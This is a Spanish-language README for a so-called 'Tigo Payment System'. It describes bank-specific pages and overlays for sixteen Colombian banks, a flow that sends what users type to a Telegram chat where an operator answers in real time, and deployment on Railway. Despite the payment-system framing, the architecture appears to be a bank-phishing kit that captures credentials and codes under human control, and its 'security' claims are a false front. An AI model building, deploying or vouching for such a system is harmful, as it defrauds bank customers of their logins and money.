# Tigo Payment System

Sistema de pagos integrado para Tigo Colombia con soporte para múltiples bancos y PSE.

## 🚀 Características

- ✅ 15 Bancos integrados (Bancolombia, Davivienda, BBVA, y más)
- ✅ Integración PSE completa
- ✅ Notificaciones en tiempo real vía Telegram
- ✅ Sistema de tarjetas de crédito/débito
- ✅ Overlays personalizados por banco
- ✅ Arquitectura centralizada y escalable

## 🏦 Bancos Soportados

1. Banco Agrario
2. AV Villas
3. Banco Mundo Mujer
4. Bancolombia
5. BBVA
6. Banco de Bogotá
7. Caja Social
8. Daviplata
9. Davivienda
10. Falabella
11. Itaú
12. Nequi
13. Occidente
14. Popular
15. Scotiabank Colpatria
16. Serfinanza

## 📦 Requisitos

- PHP 8.2+
- Composer
- Extensión PHP: cURL, JSON, mbstring

## ⚙️ Variables de Entorno

Crear archivo `.env` con:

```env
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Application Settings
APP_ENV=production
APP_DEBUG=false
APP_URL=https://your-domain.com

# Session Configuration
SESSION_LIFETIME=120
SESSION_SECURE=true
```

## 🛠️ Instalación Local

```bash
# Instalar dependencias
composer install

# Copiar archivo de entorno
cp .env.example .env

# Configurar variables en .env

# Iniciar servidor de desarrollo
php -S localhost:8000 -t public router.php
```

## 🚀 Despliegue en Railway

1. **Fork o clone este repositorio**
2. **Conecta tu repositorio en Railway**
3. **Configura las variables de entorno en Railway:**
   - `TELEGRAM_BOT_TOKEN`
   - `TELEGRAM_CHAT_ID`
4. **Railway detectará automáticamente la configuración PHP**

## 📁 Estructura del Proyecto

```
php-app/
├── public/           # Archivos públicos (entry point)
│   ├── bancas/      # Páginas de bancos
│   ├── js/          # JavaScript centralizado
│   ├── css/         # Estilos globales
│   └── api/         # Endpoints API
├── src/             # Clases PHP
│   ├── TelegramBot.php
│   └── Config/
├── templates/       # Templates PHP
├── storage/         # Almacenamiento de sesiones
├── logs/           # Logs de aplicación
├── vendor/         # Dependencias Composer
└── config/         # Configuraciones

```

## 🔧 Arquitectura

### Sistema Centralizado

- **banco-master-telegram.js**: Lógica principal que detecta banco y página automáticamente
- **bank-telegram-base.js**: Clase base para integración Telegram
- **banco-utils.js**: Utilidades y compatibilidad legacy
- **bank-config.js**: Configuración de 15 bancos (Single Source of Truth)

### Flujo de Pago

1. Usuario selecciona método de pago
2. Elige banco en PSE
3. Redirige a `/bancas/{Bank}/index.html`
4. Usuario completa datos
5. Sistema envía info a Telegram con botones
6. Operador responde en Telegram
7. Usuario recibe respuesta en <0.1s
8. Redirección automática según acción

## 🔐 Seguridad

- ✅ Validación de datos en cliente y servidor
- ✅ Sanitización de inputs
- ✅ Variables de entorno para secretos
- ✅ Sin datos sensibles en repositorio
- ✅ HTTPS obligatorio en producción

## 📊 Performance

- ⚡ Respuesta en tiempo real (<0.1s)
- ⚡ Polling optimizado (100ms)
- ⚡ Sin delays artificiales
- ⚡ Código minificado y optimizado

## 🐛 Debugging

Los logs se guardan en `/logs/`:
- `php-errors.log`: Errores PHP
- `telegram.log`: Logs de Telegram

## 📝 Licencia

Propietario - Todos los derechos reservados

## 🤝 Soporte

Para soporte, contactar al equipo de desarrollo.
